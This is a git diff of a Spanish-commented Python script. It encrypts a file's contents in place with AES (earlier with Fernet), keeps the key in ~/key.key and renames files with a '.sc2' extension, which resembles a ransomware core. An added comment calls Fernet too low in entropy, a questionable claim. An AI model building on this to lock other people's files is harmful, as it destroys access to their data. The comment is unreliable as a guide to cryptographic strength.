@@ -8,6 +8,7 @@ ruta_inicio = os.path.expanduser("~")
 ruta = os.path.join(ruta_inicio,"key.key")
 
 # =====================================OLD=================================
+# EL USO DE FERNET GENERA UNA ENTROPIA DEMASIADO BAJA
 def old_encrypt(f):
     # GENERA UN LLAVE Y LA GUARDA EN EL ARCHIVO KEY.KEY
     key = Fernet.generate_key()
@@ -20,6 +21,9 @@ def old_encrypt(f):
         file.close()
     with open(f,'wb') as file:
         file.write(fer.encrypt(original))
+
+def replace_file(file):
+    os.rename(file,file+'.sc2')
 # ======================================OLD==================================
 
 def encrypt(f):
@@ -44,9 +48,6 @@ def encrypt(f):
         f.write(cipher_aes.nonce)
         f.write(tag)
         f.write(ciphertext)
-
-def replace_file(file):
-    os.rename(file,file+'.sc2')
 
 def main(file):
     encrypt(file)
